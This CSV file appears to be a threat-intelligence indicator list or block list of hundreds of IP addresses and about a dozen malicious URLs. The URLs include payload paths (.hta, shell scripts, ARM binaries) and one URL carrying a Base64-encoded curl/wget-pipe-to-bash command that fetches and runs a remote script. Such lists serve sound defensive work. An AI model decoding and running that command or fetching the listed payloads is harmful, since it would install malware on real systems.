atom_type,atom_value
ip,46.166.162.34
ip,46.166.191.18
ip,46.167.72.179
ip,46.17.98.51
ip,46.172.127.231
ip,46.181.86.21
ip,46.183.113.147
ip,46.183.223.46
ip,46.188.90.40
ip,46.190.52.113
ip,46.200.85.158
ip,46.209.140.220
ip,46.21.153.222
ip,46.21.153.39
ip,46.214.139.81
ip,46.229.199.126
ip,46.231.204.10
ip,46.237.50.234
ip,46.240.182.133
ip,46.243.150.151
ip,46.243.217.11
ip,46.243.221.41
ip,46.246.86.14
ip,46.254.128.174
ip,46.3.199.41
ip,46.30.160.124
ip,46.33.61.127
ip,46.4.107.76
ip,46.4.51.212
ip,46.4.89.177
ip,46.4.89.183
ip,46.58.195.62
ip,46.7.110.92
ip,46.72.65.91
ip,46.8.19.211
ip,47.100.211.202
ip,47.100.227.60
ip,47.100.78.89
ip,47.100.87.17
ip,47.101.33.96
ip,47.102.110.114
ip,47.102.127.194
ip,47.104.253.89
ip,47.105.143.164
ip,47.105.34.124
ip,47.106.202.101
ip,47.107.100.128
ip,47.107.229.102
ip,47.107.236.124
ip,47.108.160.251
ip,47.108.63.51
ip,47.110.49.237
ip,47.112.133.30
ip,47.113.217.128
ip,47.113.222.34
ip,47.115.167.200
ip,47.116.142.34
ip,47.118.62.39
ip,47.119.138.1
ip,47.12.189.93
ip,47.134.138.15
ip,47.151.185.131
ip,47.18.252.135
ip,47.181.84.61
ip,47.187.108.172
ip,47.187.99.96
ip,47.200.54.107
ip,47.201.1.210
ip,47.229.174.126
ip,47.240.244.45
ip,47.241.42.138
ip,47.242.34.157
ip,47.243.236.228
ip,47.245.56.140
ip,47.246.13.234
ip,47.253.82.78
ip,47.254.170.221
ip,47.51.21.82
ip,47.56.219.26
ip,47.74.31.64
ip,47.75.122.251
ip,47.9.159.26
ip,47.92.165.237
ip,47.92.198.186
ip,47.94.2.14
ip,47.96.156.250
ip,47.96.64.138
ip,47.97.127.116
ip,47.97.38.151
ip,47.98.104.1
ip,47.98.156.92
ip,47.98.221.192
ip,47.98.232.138
ip,47.99.132.220
ip,47.99.171.121
ip,49.12.200.229
ip,49.12.42.196
ip,49.12.81.77
ip,49.144.84.21
ip,49.172.44.121
ip,49.206.29.127
ip,49.207.208.237
ip,49.228.228.147
ip,49.232.128.178
ip,49.232.148.86
ip,49.232.77.78
ip,49.234.112.148
ip,49.234.95.102
ip,49.235.197.120
ip,49.245.18.91
ip,49.34.88.106
ip,49.70.66.48
ip,49.72.44.151
ip,49.75.53.12
ip,49.76.79.61
ip,49.83.240.235
ip,49.93.83.226
ip,5.101.145.40
ip,5.101.66.180
ip,5.107.220.84
ip,5.129.224.203
ip,5.13.102.138
ip,5.13.73.44
ip,5.133.109.104
ip,5.135.180.105
ip,5.135.185.118
ip,5.137.229.16
ip,5.137.46.74
ip,5.141.44.82
ip,5.149.249.178
ip,5.15.139.129
ip,5.15.226.81
ip,5.15.29.145
ip,5.164.208.164
ip,5.165.2.8
ip,5.172.9.156
ip,5.176.228.60
ip,5.180.107.130
ip,5.180.79.11
ip,5.180.79.81
ip,5.181.156.250
ip,5.181.156.46
ip,5.181.156.77
ip,5.181.156.79
ip,5.181.235.44
ip,5.183.101.11
ip,5.183.102.97
ip,5.188.230.162
ip,5.188.230.208
ip,5.188.36.25
ip,5.189.160.61
ip,5.189.168.252
ip,5.189.183.129
ip,5.189.91.191
ip,5.193.125.67
ip,5.196.162.2
ip,5.196.174.49
ip,5.196.213.55
ip,5.196.71.110
ip,5.196.95.80
ip,5.199.162.116
ip,5.199.162.71
ip,5.202.120.150
ip,5.206.227.106
ip,5.230.70.106
ip,5.238.149.197
ip,5.25.133.16
ip,5.252.179.60
ip,5.253.84.122
ip,5.34.178.249
ip,5.34.182.123
ip,5.39.222.84
ip,5.39.226.220
ip,5.39.63.102
ip,5.39.77.70
ip,5.4.5.2
ip,5.44.45.140
ip,5.45.83.127
ip,5.45.87.29
ip,5.6.3.1
ip,5.61.37.89
ip,5.61.42.123
ip,5.61.42.216
ip,5.61.43.191
ip,5.61.46.161
ip,5.61.56.10
ip,5.61.61.168
ip,5.61.61.49
ip,5.63.154.96
ip,5.71.27.179
ip,5.79.134.39
ip,5.79.75.41
ip,5.8.16.44
ip,5.81.63.147
ip,5.9.109.72
ip,50.104.186.71
ip,50.115.172.112
ip,50.116.43.143
ip,50.116.6.175
ip,50.125.91.97
ip,50.17.5.224
ip,50.249.212.98
ip,50.72.18.34
ip,50.75.131.6
ip,50.84.233.214
ip,50.93.55.136
ip,51.103.55.228
ip,51.103.75.40
ip,51.105.233.156
ip,51.116.191.163
ip,51.138.200.164
ip,51.141.45.23
ip,51.15.126.85
ip,51.15.176.55
ip,51.15.182.109
ip,51.15.189.176
ip,51.15.231.96
ip,51.158.148.63
ip,51.161.197.23
ip,51.175.136.185
ip,51.178.104.138
ip,51.178.146.159
ip,51.178.207.67
ip,51.178.83.41
ip,51.178.86.242
ip,51.195.108.215
ip,51.195.12.181
ip,51.195.166.20
ip,51.195.166.24
ip,51.195.57.236
ip,51.195.70.170
ip,51.195.70.171
ip,51.210.5.168
ip,51.222.199.255
ip,51.222.234.64
ip,51.254.151.189
ip,51.254.191.79
ip,51.254.221.129
ip,51.254.68.137
ip,51.254.95.252
ip,51.38.114.107
ip,51.38.203.212
ip,51.68.142.233
ip,51.68.203.106
ip,51.68.46.188
ip,51.75.191.89
ip,51.75.30.200
ip,51.79.103.19
ip,51.79.166.3
ip,51.79.243.236
ip,51.79.50.122
ip,51.79.56.180
ip,51.81.110.10
ip,51.81.16.82
ip,51.81.177.165
ip,51.81.191.248
ip,51.83.203.96
ip,51.83.79.151
ip,51.89.223.6
ip,51.89.39.144
ip,52.114.77.236
ip,52.138.36.168
ip,52.14.161.64
ip,52.140.215.233
ip,52.144.47.89
ip,52.148.154.111
ip,52.164.184.146
ip,52.166.13.147
ip,52.177.173.249
ip,52.189.222.15
ip,52.200.111.193
ip,52.201.40.239
ip,52.229.22.93
ip,52.231.158.217
ip,52.231.26.149
ip,52.231.38.236
ip,52.232.211.160
ip,52.234.24.23
ip,52.24.113.106
ip,52.25.150.217
ip,52.250.60.164
ip,52.250.64.247
ip,52.252.234.34
ip,52.38.118.16
ip,52.69.92.126
ip,52.74.21.59
ip,52.74.95.76
ip,52.8.123.250
ip,52.80.127.131
ip,52.85.150.32
ip,52.88.220.108
ip,54.144.8.103
ip,54.145.127.222
ip,54.180.94.177
ip,54.189.204.32
ip,54.191.39.190
ip,54.191.98.150
ip,54.194.70.155
ip,54.199.27.97
ip,54.209.131.199
ip,54.214.197.200
ip,54.215.216.159
ip,54.221.23.236
ip,54.237.228.189
ip,54.245.200.173
ip,54.246.255.105
ip,54.253.102.232
ip,54.37.160.138
ip,54.37.191.165
ip,54.37.202.209
ip,54.37.233.116
ip,54.39.209.225
ip,54.66.44.132
ip,54.67.44.62
ip,54.68.142.114
ip,54.86.65.135
ip,54.93.79.162
ip,58.100.164.147
ip,58.126.223.166
ip,58.143.95.146
ip,58.153.204.9
ip,58.215.145.105
ip,58.218.215.139
ip,58.249.86.162
ip,58.255.135.66
ip,58.64.199.11
ip,58.97.224.41
ip,58.97.227.199
ip,59.1.13.155
ip,59.110.20.113
ip,59.115.85.11
ip,59.148.127.38
ip,59.153.114.201
ip,59.153.243.172
ip,59.167.200.123
ip,59.18.218.52
ip,59.180.189.201
ip,59.26.204.210
ip,59.29.226.174
ip,59.52.185.233
ip,59.90.246.200
ip,59.92.214.117
ip,59.92.216.128
ip,59.93.22.106
ip,59.93.26.175
ip,59.93.30.241
ip,59.94.192.231
ip,59.94.193.1
ip,59.94.193.117
ip,59.94.193.66
ip,59.94.197.94
ip,59.94.198.71
ip,59.94.200.34
ip,59.94.206.7
ip,59.95.68.122
ip,59.96.24.13
ip,59.96.26.204
ip,59.96.27.182
ip,59.98.103.80
ip,59.98.96.214
ip,59.99.138.14
ip,59.99.138.243
ip,59.99.203.131
ip,59.99.205.16
ip,59.99.45.119
ip,60.125.58.120
ip,60.126.40.122
ip,60.155.241.6
ip,60.162.183.158
ip,60.173.88.189
ip,60.180.1.18
ip,60.31.184.208
ip,61.173.79.85
ip,61.184.215.177
ip,61.220.29.237
ip,61.3.126.96
ip,61.3.184.27
ip,61.36.35.122
ip,61.38.252.166
ip,61.42.53.228
ip,61.84.209.235
ip,62.1.106.164
ip,62.109.24.104
ip,62.109.4.26
ip,62.109.9.242
ip,62.112.11.79
ip,62.113.112.210
ip,62.14.242.133
ip,62.151.181.35
ip,62.16.45.153
ip,62.165.192.53
ip,62.171.160.203
ip,62.171.162.130
ip,62.171.165.146
ip,62.171.179.103
ip,62.181.147.15
ip,62.182.156.188
ip,62.182.159.35
ip,62.192.37.138
ip,62.192.61.57
ip,62.197.120.114
ip,62.205.207.253
ip,62.210.102.45
ip,62.210.112.220
ip,62.210.73.100
ip,62.210.82.223
ip,62.38.111.70
ip,62.63.221.89
ip,62.75.161.205
ip,62.81.118.50
ip,63.211.111.152
ip,63.231.117.0
ip,63.35.238.135
ip,64.186.23.71
ip,64.188.13.141
ip,64.188.16.142
ip,64.224.76.152
ip,64.225.166.16
ip,64.225.54.148
ip,64.225.68.134
ip,64.225.74.152
ip,64.225.74.183
ip,64.225.79.44
ip,64.227.119.213
ip,64.227.31.233
ip,64.227.64.57
ip,64.227.78.70
ip,64.69.57.203
ip,64.69.57.211
ip,64.74.160.218
ip,64.74.160.228
ip,65.100.244.179
ip,65.108.21.17
ip,65.108.21.21
ip,65.108.29.194
ip,65.108.29.202
ip,65.108.5.215
ip,65.108.55.203
ip,65.108.81.240
ip,65.21.110.153
ip,65.21.125.99
ip,65.21.226.115
ip,65.21.231.57
ip,65.21.236.62
ip,65.21.7.205
ip,65.21.76.42
ip,65.29.116.74
ip,66.154.107.133
ip,66.154.113.12
ip,66.165.246.75
ip,66.181.188.200
ip,66.187.7.147
ip,66.208.244.253
ip,66.216.193.114
ip,66.228.134.180
ip,66.228.49.123
ip,66.29.138.189
ip,66.29.138.19
ip,66.29.138.190
ip,66.29.138.20
ip,66.29.138.22
ip,66.29.149.113
ip,66.42.100.143
ip,66.42.113.16
ip,66.42.33.21
ip,66.42.40.60
ip,66.42.59.10
ip,66.42.72.250
ip,66.42.99.80
ip,66.56.139.8
ip,66.68.226.237
ip,66.70.218.54
ip,66.79.100.113
ip,67.140.45.246
ip,67.149.209.200
ip,67.180.216.254
ip,67.184.2.234
ip,67.193.224.142
ip,67.196.50.240
ip,67.205.154.243
ip,67.205.163.14
ip,67.205.164.4
ip,67.205.174.210
ip,67.246.243.238
ip,67.254.215.172
ip,67.43.4.76
ip,67.5.28.72
ip,67.83.41.27
ip,68.1.171.93
ip,68.109.166.98
ip,68.142.122.37
ip,68.161.185.65
ip,68.168.126.114
ip,68.183.191.234
ip,68.183.193.20
ip,68.183.20.194
ip,68.183.200.251
ip,68.183.205.156
ip,68.183.216.148
ip,68.183.35.171
ip,68.183.74.195
ip,68.183.81.213
ip,68.194.117.149
ip,68.201.55.46
ip,68.235.33.167
ip,68.39.177.147
ip,68.46.225.201
ip,68.65.122.157
ip,68.65.122.169
ip,69.163.34.145
ip,69.40.17.142
ip,69.47.94.57
ip,69.61.28.68
ip,69.61.41.126
ip,69.61.84.206
ip,69.61.84.245
ip,69.92.67.34
ip,7.8.0.80
ip,70.118.50.62
ip,70.235.74.189
ip,70.36.97.202
ip,70.39.99.196
ip,70.49.151.178
ip,70.49.88.199
ip,70.54.25.76
ip,71.163.222.64
ip,71.163.223.144
ip,71.163.223.150
ip,71.163.223.159
ip,71.225.107.12
ip,71.28.247.154
ip,71.66.246.11
ip,71.66.92.190
ip,71.83.212.195
ip,72.167.43.198
ip,72.186.233.102
ip,72.187.147.100
ip,72.21.17.25
ip,72.252.198.232
ip,72.255.34.15
ip,73.12.168.32
ip,73.123.252.123
ip,73.137.184.163
ip,73.138.124.217
ip,73.140.88.255
ip,73.143.177.125
ip,73.164.47.185
ip,73.182.40.208
ip,73.238.60.85
ip,73.52.114.202
ip,73.6.0.166
ip,73.77.14.205
ip,73.91.184.152
ip,73.93.129.252
ip,74.119.194.219
ip,74.119.195.156
ip,74.119.195.188
ip,74.124.24.29
ip,74.135.85.117
ip,74.199.99.159
ip,74.201.28.116
ip,74.201.73.122
ip,74.207.250.89
ip,74.208.108.87
ip,74.208.18.105
ip,74.208.186.30
ip,74.208.94.86
ip,74.91.117.215
ip,75.109.223.243
ip,75.118.158.174
ip,75.137.47.174
ip,75.165.112.82
ip,75.74.103.210
ip,75.89.195.186
ip,75.90.212.209
ip,76.107.45.32
ip,76.174.137.168
ip,76.31.121.179
ip,76.8.98.153
ip,77.109.89.34
ip,77.121.208.209
ip,77.136.21.144
ip,77.203.174.118
ip,77.220.212.176
ip,77.220.64.133
ip,77.220.64.135
ip,77.220.64.137
ip,77.220.64.140
ip,77.220.64.146
ip,77.232.38.125
ip,77.232.38.34
ip,77.232.39.148
ip,77.232.41.231
ip,77.232.42.253
ip,77.237.181.212
ip,77.237.188.30
ip,77.244.75.120
ip,77.245.5.106
ip,77.246.144.104
ip,77.247.110.6
ip,77.247.127.24
ip,77.247.127.37
ip,77.27.204.204
ip,77.27.25.224
ip,77.31.120.194
ip,77.31.46.230
ip,77.37.145.54
ip,77.37.170.200
ip,77.43.132.243
ip,77.43.189.10
ip,77.70.127.32
ip,77.70.5.68
ip,77.77.222.152
ip,77.78.33.78
ip,77.81.244.242
ip,77.81.247.140
ip,77.81.247.25
ip,77.82.216.63
ip,77.83.175.169
ip,77.83.199.61
ip,78.128.112.137
ip,78.139.22.184
ip,78.142.18.183
ip,78.142.220.121
ip,78.168.59.252
ip,78.170.143.11
ip,78.172.247.210
ip,78.18.197.71
ip,78.180.179.136
ip,78.189.219.196
ip,78.191.24.189
ip,78.191.36.142
ip,78.191.49.39
ip,78.192.65.120
ip,78.24.217.151
ip,78.31.66.214
ip,78.36.10.247
ip,78.36.202.218
ip,78.46.100.59
ip,78.46.225.155
ip,78.46.78.42
ip,78.47.64.46
ip,78.47.81.226
ip,78.56.82.184
ip,78.62.115.135
ip,78.69.231.69
ip,78.97.231.247
ip,79.113.242.225
ip,79.113.250.136
ip,79.114.236.11
ip,79.118.187.79
ip,79.121.11.134
ip,79.134.225.113
ip,79.134.225.119
ip,79.134.225.120
ip,79.134.225.124
ip,79.134.225.13
ip,79.134.225.14
ip,79.134.225.16
ip,79.134.225.21
ip,79.134.225.30
ip,79.134.225.32
ip,79.134.225.34
ip,79.134.225.36
ip,79.134.225.40
ip,79.134.225.43
ip,79.134.225.47
ip,79.134.225.49
ip,79.134.225.52
ip,79.134.225.6
ip,79.134.225.62
ip,79.134.225.73
ip,79.134.225.75
ip,79.134.225.76
ip,79.134.225.91
ip,79.141.161.176
ip,79.141.163.35
ip,79.141.166.249
ip,79.143.186.150
ip,79.143.87.120
ip,79.157.205.9
ip,79.177.140.130
ip,79.191.159.175
ip,79.201.33.203
ip,79.209.83.68
ip,79.69.130.43
ip,8.129.19.73
ip,8.129.237.254
ip,8.131.84.239
ip,8.134.115.80
ip,8.140.44.225
ip,8.142.46.13
ip,8.156.29.211
ip,8.208.103.182
ip,8.209.67.224
ip,8.210.14.186
ip,8.210.18.37
ip,8.210.63.158
ip,8.210.86.230
ip,8.217.14.135
ip,8.39.147.62
ip,8.39.147.82
ip,8.39.147.87
ip,8.9.37.214
ip,80.11.32.115
ip,80.132.245.44
ip,80.211.166.28
ip,80.211.33.13
ip,80.216.128.105
ip,80.232.221.225
ip,80.241.218.90
ip,80.246.81.211
ip,80.246.94.100
ip,80.44.20.119
ip,80.66.87.32
ip,80.66.87.52
ip,80.66.87.53
ip,80.78.244.19
ip,80.85.138.229
ip,80.85.86.243
ip,80.86.91.27
ip,80.87.194.232
ip,80.89.230.147
ip,80.89.230.172
ip,80.89.234.187
ip,80.89.237.147
ip,80.92.205.112
ip,80.92.205.137
ip,80.92.205.153
ip,80.92.206.111
ip,80.92.206.135
ip,80.92.206.25
ip,80.98.43.158
ip,80.99.21.252
ip,81.0.236.71
ip,81.169.163.107
ip,81.169.224.222
ip,81.171.17.89
ip,81.171.22.94
ip,81.171.9.135
ip,81.181.160.94
ip,81.214.190.240
ip,81.23.220.63
ip,81.232.0.91
ip,81.235.133.169
ip,81.243.165.202
ip,81.25.53.148
ip,81.30.176.208
ip,81.33.243.252
ip,81.68.139.107
ip,81.68.221.97
ip,81.68.82.115
ip,81.69.10.50
ip,81.69.26.175
ip,81.70.0.80
ip,81.70.132.230
ip,81.70.143.54
ip,81.70.155.208
ip,81.70.255.64
ip,81.70.58.168
ip,81.71.121.86
ip,81.95.45.234
ip,82.102.18.110
ip,82.102.31.170
ip,82.118.22.245
ip,82.118.23.92
ip,82.118.235.105
ip,82.131.245.18
ip,82.146.63.219
ip,82.148.19.199
ip,82.151.125.186
ip,82.156.13.32
ip,82.156.196.148
ip,82.156.197.177
ip,82.156.26.22
ip,82.156.34.150
ip,82.156.89.68
ip,82.157.1.215
ip,82.157.202.27
ip,82.157.25.163
ip,82.165.145.100
ip,82.165.65.107
ip,82.20.36.119
ip,82.209.101.122
ip,82.215.105.207
ip,82.22.165.42
ip,82.223.151.164
ip,82.223.2.130
ip,82.64.141.173
ip,82.76.239.193
ip,83.102.217.52
ip,83.136.232.140
ip,83.136.232.97
ip,83.136.233.143
ip,83.143.32.73
ip,83.148.36.102
ip,83.193.10.199
ip,83.220.173.160
ip,83.233.99.122
ip,83.243.251.46
ip,83.248.71.81
ip,83.251.53.228
ip,83.69.2.130
ip,83.8.159.32
ip,83.84.150.54
ip,83.91.160.129
ip,83.92.63.154
ip,83.97.20.196
ip,84.108.70.97
ip,84.115.235.104
ip,84.117.43.216
ip,84.17.39.201
ip,84.17.41.131
ip,84.201.188.187
ip,84.227.80.36
ip,84.236.124.192
ip,84.38.130.171
ip,84.38.130.220
ip,84.38.132.31
ip,84.38.134.66
ip,84.38.135.175
ip,84.38.181.56
ip,84.52.94.75
ip,84.53.198.43
ip,84.53.216.187
ip,84.53.216.63
ip,84.53.229.254
ip,84.54.57.62
ip,84.54.58.87
ip,84.79.52.204
ip,85.10.195.175
ip,85.107.68.115
ip,85.110.183.182
ip,85.112.74.178
ip,85.122.141.42
ip,85.143.174.81
ip,85.159.214.61
ip,85.17.172.81
ip,85.17.219.100
ip,85.170.141.140
ip,85.175.171.246
ip,85.186.233.237
ip,85.187.218.68
ip,85.202.169.136
ip,85.204.116.83
ip,85.206.165.111
ip,85.208.184.233
ip,85.237.217.241
ip,85.248.1.126
ip,85.54.179.210
ip,85.74.18.171
ip,85.86.181.192
ip,86.105.252.21
ip,86.105.252.237
ip,86.106.181.166
ip,86.106.181.31
ip,86.106.181.70
ip,86.107.197.3
ip,86.123.106.54
ip,86.123.228.81
ip,86.125.209.126
ip,86.126.195.16
ip,86.126.220.203
ip,86.144.150.29
ip,86.147.80.186
ip,86.152.43.223
ip,86.154.2.69
ip,86.160.137.132
ip,86.160.137.225
ip,86.173.96.126
ip,86.173.96.86
ip,86.18.99.199
ip,86.220.112.26
ip,86.49.161.18
ip,86.49.242.2
ip,86.8.218.249
ip,86.97.162.85
ip,86.97.8.249
ip,86.97.8.63
ip,86.98.67.103
ip,86.98.71.188
ip,86.99.134.158
ip,87.103.195.248
ip,87.115.73.2
ip,87.117.185.35
ip,87.118.117.45
ip,87.118.123.70
ip,87.120.254.112
ip,87.120.254.39
ip,87.120.37.152
ip,87.120.37.71
ip,87.120.8.80
ip,87.120.8.87
ip,87.121.52.186
ip,87.121.52.85
ip,87.132.215.23
ip,87.138.139.76
ip,87.172.157.213
ip,87.202.87.210
ip,87.225.12.203
ip,87.251.70.244
ip,87.251.70.33
ip,87.251.71.125
ip,87.251.71.185
ip,87.251.71.199
ip,87.251.71.21
ip,87.251.71.4
ip,87.251.71.64
ip,87.251.71.82
ip,87.251.71.93
ip,87.251.79.157
ip,87.252.182.132
ip,87.7.243.105
ip,87.90.86.173
ip,87.98.245.48
ip,88.119.175.251
ip,88.150.240.129
ip,88.198.96.91
ip,88.214.26.38
ip,88.214.57.226
ip,88.218.16.126
ip,88.218.47.29
ip,88.226.225.168
ip,88.230.23.164
ip,88.99.219.185
ip,89.105.217.244
ip,89.109.34.55
ip,89.11.132.24
ip,89.133.79.70
ip,89.136.112.74
ip,89.137.215.100
ip,89.14.28.20
ip,89.149.200.215
ip,89.164.254.28
ip,89.169.83.10
ip,89.176.37.202
ip,89.182.123.92
ip,89.182.88.61
ip,89.187.145.54
ip,89.187.161.208
ip,89.187.162.98
ip,89.187.168.2
ip,89.191.248.5
ip,89.191.254.170
ip,89.211.252.190
ip,89.216.176.34
ip,89.223.29.111
ip,89.223.69.212
ip,89.233.104.152
ip,89.239.165.13
ip,89.242.157.25
ip,89.29.244.225
ip,89.35.30.200
ip,89.35.30.236
ip,89.38.69.136
ip,89.38.69.99
ip,89.39.106.168
ip,89.40.183.205
ip,89.41.182.114
ip,89.41.182.27
ip,89.41.26.122
ip,89.42.234.232
ip,89.43.107.85
ip,89.44.79.191
ip,89.44.9.150
ip,89.44.9.160
ip,89.44.9.250
ip,89.44.9.69
ip,89.45.4.110
ip,89.68.28.16
ip,90.114.19.175
ip,90.154.71.123
ip,90.16.59.229
ip,90.160.10.120
ip,90.193.107.193
ip,90.195.35.84
ip,90.249.106.64
ip,90.253.208.22
ip,90.53.100.20
ip,90.61.30.155
ip,90.8.148.225
ip,91.106.163.5
ip,91.109.131.178
ip,91.109.176.6
ip,91.109.176.8
ip,91.109.178.11
ip,91.109.178.2
ip,91.109.180.7
ip,91.109.184.10
ip,91.109.184.6
ip,91.109.186.13
ip,91.109.188.3
ip,91.109.188.6
ip,91.109.190.2
ip,91.109.190.4
ip,91.120.20.100
ip,91.121.121.216
ip,91.121.146.27
ip,91.121.83.60
ip,91.125.21.16
ip,91.132.3.226
ip,91.134.14.25
ip,91.134.150.150
ip,91.140.90.215
ip,91.142.77.198
ip,91.142.77.238
ip,91.151.88.146
ip,91.151.94.60
ip,91.167.224.106
ip,91.170.21.225
ip,91.189.117.8
ip,91.193.183.73
ip,91.193.19.170
ip,91.193.19.195
ip,91.193.19.251
ip,91.193.19.51
ip,91.193.75.16
ip,91.193.75.189
ip,91.193.75.238
ip,91.193.75.245
ip,91.194.11.86
ip,91.196.112.68
ip,91.196.94.231
ip,91.197.21.29
ip,91.201.172.52
ip,91.201.225.161
ip,91.201.240.105
ip,91.203.145.250
ip,91.206.15.183
ip,91.207.173.118
ip,91.207.173.124
ip,91.207.174.156
ip,91.210.105.42
ip,91.212.150.195
ip,91.214.124.115
ip,91.217.139.63
ip,91.219.239.43
ip,91.219.62.42
ip,91.219.63.223
ip,91.224.179.21
ip,91.225.104.43
ip,91.235.129.135
ip,91.235.129.68
ip,91.235.129.8
ip,91.235.175.119
ip,91.236.120.237
ip,91.237.161.87
ip,91.241.19.18
ip,91.241.19.241
ip,91.242.229.222
ip,91.243.121.19
ip,91.243.32.14
ip,91.243.32.158
ip,91.243.32.20
ip,91.243.32.45
ip,91.243.32.71
ip,91.243.81.71
ip,91.244.220.36
ip,91.245.138.233
ip,91.245.253.6
ip,91.245.253.80
ip,91.245.255.108
ip,91.247.106.242
ip,91.247.127.54
ip,91.83.93.219
ip,91.90.194.52
ip,91.92.109.103
ip,91.92.109.136
ip,91.92.109.40
ip,91.92.56.171
ip,92.118.189.254
ip,92.119.113.20
ip,92.119.157.58
ip,92.119.157.74
ip,92.126.212.111
ip,92.137.22.199
ip,92.151.52.150
ip,92.157.171.41
ip,92.219.126.135
ip,92.222.145.236
ip,92.222.72.160
ip,92.223.90.68
ip,92.223.90.69
ip,92.245.116.10
ip,92.249.124.241
ip,92.38.178.27
ip,92.46.109.42
ip,92.63.103.224
ip,92.63.107.136
ip,92.63.192.57
ip,92.63.193.208
ip,92.85.191.178
ip,92.97.180.228
ip,93.100.80.169
ip,93.114.128.190
ip,93.114.192.211
ip,93.115.20.205
ip,93.115.20.247
ip,93.115.21.156
ip,93.115.21.41
ip,93.115.22.17
ip,93.117.137.156
ip,93.118.32.31
ip,93.157.171.169
ip,93.170.123.138
ip,93.170.123.238
ip,93.173.84.81
ip,93.177.6.173
ip,93.190.95.112
ip,93.38.112.246
ip,93.39.220.202
ip,93.40.228.63
ip,93.55.225.0
ip,93.80.16.4
ip,93.84.115.205
ip,93.90.223.18
ip,93.95.160.61
ip,94.103.83.88
ip,94.103.88.172
ip,94.103.9.133
ip,94.103.9.139
ip,94.103.9.167
ip,94.103.9.200
ip,94.103.94.203
ip,94.124.78.10
ip,94.130.170.71
ip,94.130.216.28
ip,94.140.112.131
ip,94.140.112.47
ip,94.140.112.9
ip,94.140.112.97
ip,94.140.114.136
ip,94.140.114.188
ip,94.140.114.231
ip,94.140.114.61
ip,94.140.115.158
ip,94.142.179.179
ip,94.142.179.77
ip,94.158.245.250
ip,94.177.123.118
ip,94.196.209.83
ip,94.198.40.34
ip,94.202.54.1
ip,94.21.193.64
ip,94.215.180.29
ip,94.226.162.203
ip,94.23.7.201
ip,94.23.86.141
ip,94.231.117.76
ip,94.232.46.90
ip,94.237.84.12
ip,94.244.186.109
ip,94.245.130.53
ip,94.247.168.64
ip,94.250.250.77
ip,94.250.251.106
ip,94.250.252.7
ip,94.26.228.204
ip,94.26.228.218
ip,94.26.248.150
ip,94.41.175.31
ip,94.49.90.92
ip,94.78.214.179
ip,95.111.241.233
ip,95.132.205.123
ip,95.138.161.226
ip,95.159.33.115
ip,95.165.154.11
ip,95.168.174.51
ip,95.169.0.244
ip,95.169.10.212
ip,95.181.152.12
ip,95.181.152.14
ip,95.181.152.6
ip,95.181.152.9
ip,95.181.157.130
ip,95.181.172.100
ip,95.181.178.110
ip,95.181.179.72
ip,95.211.117.105
ip,95.211.136.213
ip,95.211.175.151
ip,95.211.213.220
ip,95.213.179.67
ip,95.213.224.25
ip,95.215.207.185
ip,95.215.207.58
ip,95.215.207.87
ip,95.216.226.236
ip,95.217.114.110
ip,95.217.123.103
ip,95.217.123.5
ip,95.217.140.34
ip,95.217.144.93
ip,95.217.187.221
ip,95.217.209.49
ip,95.217.232.91
ip,95.217.248.40
ip,95.22.88.72
ip,95.25.101.193
ip,95.28.153.187
ip,95.32.104.136
ip,95.32.138.157
ip,95.32.18.81
ip,95.37.225.177
ip,95.42.106.240
ip,95.54.174.42
ip,95.71.45.236
ip,95.72.33.166
ip,95.73.16.112
ip,95.76.18.58
ip,95.8.254.201
ip,95.82.233.38
ip,95.84.136.122
ip,95.84.158.71
ip,95.90.219.160
ip,95.95.28.224
ip,96.126.113.28
ip,96.30.199.194
ip,96.44.189.195
ip,96.83.180.29
ip,96.9.210.115
ip,96.9.226.19
ip,97.107.127.161
ip,98.117.39.160
ip,98.203.26.168
ip,98.238.116.145
ip,98.34.58.195
ip,98.41.98.152
ip,99.137.75.52
ip,99.196.208.15
ip,99.230.27.131
ip,99.239.238.164
ip,99.52.255.58
ip,99.84.109.37
ip,99.84.120.78
ip,99.84.170.152
ip,99.84.170.182
url,http://114.132.231.19/OK1.hta
url,http://135.125.217.87/static.c
url,http://138.197.206.223/wp-content/themes/twentysixteen/dk86
url,http://141.98.83.139:18080/nG60k1
url,http://154.247.218.44:8000/wsnbb.sh
url,http://157.230.189.52/wp-content/themes/twentynineteen/ldm
url,http://164.52.212.196:88/Jamf
url,http://18.228.7.109/.log
url,http://34.221.40.237/.x/pty11
url,http://80.71.158.12:5557
url,http://80.71.158.12:5557/Basic/Command/Base64/KGN1cmwgLXMgODAuNzEuMTU4LjEyL2xoLnNofHx3Z2V0IC1xIC1PLSA4MC43MS4xNTguMTIvbGguc2gpfGJhc2g=
url,http://91.200.103.249:8080/multi/bins/arm5
